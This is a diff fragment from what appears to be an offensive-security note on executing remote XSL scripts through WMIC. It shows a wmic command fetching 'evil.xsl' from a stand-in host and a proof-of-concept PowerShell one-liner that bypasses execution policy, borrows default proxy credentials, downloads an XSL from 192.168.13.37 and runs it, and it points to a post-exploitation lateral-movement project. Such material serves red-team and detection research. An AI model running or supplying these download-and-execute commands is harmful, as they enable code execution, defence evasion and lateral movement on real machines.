@@ -38,8 +38,7 @@ Remote File example:
 wmic os get /FORMAT:"https://example.com/evil.xsl"
 
 Basic PoC payload using Powershell+Proxy authentication (from IE config.):
-PS C:\Users\pwnd\Desktop> powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('192.168.13.37/test.xsl') -outfile test.xsl";wmic os get /format:"test.xsl"
-
+PS C:\Users\pwnd\Desktop> powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('192.168.13.37/test2.xsl') -outfile test2.xsl";$cmd="wmic os get /format:'test2.xsl'"; iex $cmd
 
 Post-exploit Project that already implement this king of lateral movement:
 https://github.com/zerosum0x0/koadic
